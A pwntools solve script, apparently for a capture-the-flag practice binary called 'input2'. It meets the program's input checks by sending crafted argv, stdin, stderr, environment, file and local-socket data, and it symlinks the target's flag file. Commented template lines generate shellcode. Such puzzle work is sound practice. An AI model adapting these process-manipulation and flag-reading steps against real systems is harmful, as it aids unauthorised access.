#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template input2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'input2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No


# stage 1 just set 100 args (argv[0] is exe.path)
argv = [ f"argv{x}" for x in range(99) ]
argv[ord('A')-1] = ''
argv[ord('B')-1] = '\x20\x0a\x0d'

import os # for stage 2
errr, errw = os.pipe()

# stage 3
env = {'\xde\xad\xbe\xef':'\xca\xfe\xba\xbe'}

# stage 4
import tempfile
with tempfile.TemporaryDirectory() as tmp:
  os.chdir(tmp)
  with open('\x0a', 'wb') as fout:
      fout.write(b'\0' * 4)

  os.symlink("/home/input2/flag", "flag") # so chdir doesn't break final cat

  # stage 5
  PORT = "9666"
  argv[ord('C') - 1] = PORT

  io = start(argv=argv, stderr=errr, env=env)

  # stage 2 is sending stdio
  io.send(b'\x00\x0a\x00\xff')
  os.write(errw, b'\x00\x0a\x02\xff')

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

  io2 = connect('127.0.0.1', PORT)
  io2.sendline(b'\xde\xad\xbe\xef')


  io.interactive()

